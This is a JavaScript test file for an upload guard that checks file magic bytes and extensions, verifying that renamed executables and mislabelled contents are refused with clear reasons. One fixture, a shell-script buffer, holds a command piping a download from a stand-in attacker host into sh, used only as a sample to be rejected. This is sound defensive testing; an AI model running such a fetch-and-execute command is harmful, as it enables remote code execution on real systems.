import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { looksLikeSupportedFile } from "../../server/uploadGuard.js";

const FIX = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../fixtures/documents");
const read = (name) => fs.readFileSync(path.join(FIX, name));

/* Buffers that pass a format's magic-byte check.
   The binary ones deliberately carry NUL bytes, exactly as the real formats do.
   That is load-bearing: if a format's branch were deleted the value would fall
   through to the text check, and a NUL-free stand-in would sail through it and
   let the mutation pass unnoticed. */
const ZIP = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(60)]);
const ZIP_EMPTY = Buffer.concat([Buffer.from([0x50, 0x4b, 0x05, 0x06]), Buffer.alloc(60)]);
const OLE2 = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0]), Buffer.alloc(60)]);
const PDF = Buffer.concat([Buffer.from("%PDF-1.7\n"), Buffer.alloc(60)]);
const TEXT = Buffer.from("a,b,c\n1,2,3\nplain text, no NUL anywhere\n");

/* A renamed executable that is pure ASCII. A shell script is the honest threat
   model here -- it has no NUL to trip the text check, so only a real magic-byte
   branch can refuse it. */
const SCRIPT = Buffer.from("#!/bin/sh\ncurl evil.example | sh\n");
/* And the Windows flavour: "MZ" followed by NULs. */
const EXE = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(60)]);

const SUPPORTED = [".xlsx", ".xlsm", ".xls", ".csv", ".pdf", ".docx", ".txt", ".md"];

/* One good and one bad sample per supported extension. Every entry is dispatched
   by the table-driven tests below, so a format cannot be quietly left untested. */
const CASES = [
  { ext: ".xlsx", good: ZIP, bad: TEXT },
  { ext: ".xlsm", good: ZIP, bad: TEXT },
  { ext: ".xls", good: OLE2, bad: TEXT },
  { ext: ".csv", good: TEXT, bad: EXE },
  { ext: ".pdf", good: PDF, bad: SCRIPT },
  { ext: ".docx", good: ZIP, bad: TEXT },
  { ext: ".txt", good: TEXT, bad: EXE },
  { ext: ".md", good: TEXT, bad: EXE },
];

test("the case table covers every supported extension", () => {
  assert.deepEqual(CASES.map((c) => c.ext), SUPPORTED);
});

for (const { ext, good } of CASES) {
  test(`a real ${ext} is accepted`, () => {
    assert.deepEqual(looksLikeSupportedFile(good, `sample${ext}`), { ok: true });
  });
}

for (const { ext, bad } of CASES) {
  test(`a file whose contents are not a ${ext} is refused, and the reason names ${ext}`, () => {
    const verdict = looksLikeSupportedFile(bad, `sample${ext}`);
    assert.equal(verdict.ok, false, `${ext} accepted contents that are not a ${ext}`);
    assert.match(verdict.reason, new RegExp(`not a real \\${ext}\\b`));
  });
}

for (const { ext, good } of CASES) {
  test(`an upper-case ${ext.toUpperCase()} is judged by the same rules`, () => {
    assert.deepEqual(looksLikeSupportedFile(good, `SAMPLE${ext.toUpperCase()}`), { ok: true });
  });
}

test("a PDF is vouched for by its header, not by a lookalike prefix", () => {
  assert.equal(looksLikeSupportedFile(read("status-report.pdf"), "report.pdf").ok, true);
  assert.equal(looksLikeSupportedFile(read("scanned.pdf"), "scan.pdf").ok, true);

  /* "%PDF" without the "-" is not how any real PDF starts. */
  const nearly = Buffer.concat([Buffer.from("%PDFxxxx"), Buffer.alloc(60)]);
  assert.equal(looksLikeSupportedFile(nearly, "report.pdf").ok, false);
});

test("a renamed executable claiming to be a PDF is refused as not a PDF", () => {
  for (const impostor of [EXE, SCRIPT, ZIP]) {
    const verdict = looksLikeSupportedFile(impostor, "report.pdf");
    assert.equal(verdict.ok, false);
    /* Not merely "binary" -- that verdict would also come from the text check,
       so it would not prove the .pdf branch ran. */
    assert.match(verdict.reason, /not a PDF/);
  }
});

test("a docx must be a zip, and is refused as a document rather than a workbook", () => {
  assert.equal(looksLikeSupportedFile(ZIP, "a.docx").ok, true);
  assert.equal(looksLikeSupportedFile(ZIP_EMPTY, "a.docx").ok, true);

  const verdict = looksLikeSupportedFile(Buffer.from("plain text here, not a zip"), "a.docx");
  assert.equal(verdict.ok, false);
  assert.match(verdict.reason, /not a real \.docx/);
  assert.match(verdict.reason, /document/);
  assert.doesNotMatch(verdict.reason, /workbook/);
});

test("a renamed executable claiming to be a docx is refused", () => {
  assert.equal(looksLikeSupportedFile(SCRIPT, "notes.docx").ok, false);
  assert.equal(looksLikeSupportedFile(EXE, "notes.docx").ok, false);
});

test("txt and md accept real text and refuse binary", () => {
  assert.equal(looksLikeSupportedFile(read("status-report.md"), "status-report.md").ok, true);
  assert.equal(looksLikeSupportedFile(Buffer.from("# Heading\n\nSome notes.\n"), "notes.md").ok, true);
  assert.equal(looksLikeSupportedFile(Buffer.from("just some notes here\n"), "notes.txt").ok, true);

  const withNul = Buffer.concat([Buffer.from("hello"), Buffer.from([0x00]), Buffer.alloc(16)]);
  for (const name of ["notes.txt", "notes.md"]) {
    const verdict = looksLikeSupportedFile(withNul, name);
    assert.equal(verdict.ok, false, `${name} accepted binary contents`);
    assert.match(verdict.reason, /binary/);
  }
});

test("a NUL beyond the first block is not enough to condemn a text file", () => {
  const late = Buffer.concat([Buffer.alloc(512, 0x41), Buffer.from([0x00])]);
  assert.equal(looksLikeSupportedFile(late, "notes.txt").ok, true);
});

test("workbooks still pass exactly as before", () => {
  assert.equal(looksLikeSupportedFile(ZIP, "book.xlsx").ok, true);
  assert.equal(looksLikeSupportedFile(ZIP_EMPTY, "book.xlsx").ok, true);
  assert.equal(looksLikeSupportedFile(ZIP, "book.xlsm").ok, true);
  assert.equal(looksLikeSupportedFile(OLE2, "book.xls").ok, true);
  assert.equal(looksLikeSupportedFile(Buffer.from("a,b,c\n1,2,3"), "book.csv").ok, true);
});

test("the wording the upload route already surfaces is unchanged", () => {
  /* test/api/app.test.js asserts on these strings reaching the client. */
  assert.equal(
    looksLikeSupportedFile(Buffer.from("PK-not-really"), "evil.xlsx").reason,
    "not a real .xlsx — the contents are not a workbook",
  );
  assert.equal(
    looksLikeSupportedFile(OLE2, "book.xlsx").ok,
    false,
  );
  assert.equal(
    looksLikeSupportedFile(EXE, "book.csv").reason,
    "not a real .csv — the contents are binary",
  );
  assert.equal(
    looksLikeSupportedFile(TEXT, "book.xls").reason,
    "not a real .xls — the contents are not a workbook",
  );
});

test("an unsupported type names itself in the refusal", () => {
  const verdict = looksLikeSupportedFile(Buffer.alloc(64), "photo.png");
  assert.equal(verdict.ok, false);
  assert.match(verdict.reason, /\.png/);
  assert.match(verdict.reason, /not a supported file type/);
});

test("the refusal lists every type that is actually supported", () => {
  const { reason } = looksLikeSupportedFile(Buffer.alloc(64), "photo.png");
  for (const ext of SUPPORTED) {
    assert.ok(reason.includes(ext), `the refusal does not offer ${ext}: ${reason}`);
  }
});

test("a file with no extension at all is refused without an empty name", () => {
  const verdict = looksLikeSupportedFile(Buffer.alloc(64), "README");
  assert.equal(verdict.ok, false);
  assert.match(verdict.reason, /^that is not a supported file type/);
});

test("an executable is refused however it is dressed up", () => {
  for (const name of ["setup.exe", "run.bat", "payload.dll", "go.ps1"]) {
    assert.equal(looksLikeSupportedFile(EXE, name).ok, false, `${name} was accepted`);
  }
});

test("an empty, truncated or missing buffer is refused rather than crashing", () => {
  for (const name of ["a.pdf", "a.docx", "a.txt", "a.md", "a.xlsx", "a.csv"]) {
    assert.deepEqual(looksLikeSupportedFile(Buffer.from("%PDF-"), name), {
      ok: false,
      reason: "the file is empty or truncated",
    });
    assert.equal(looksLikeSupportedFile(Buffer.alloc(0), name).ok, false);
    assert.equal(looksLikeSupportedFile(null, name).ok, false);
    assert.equal(looksLikeSupportedFile(undefined, name).ok, false);
  }
});
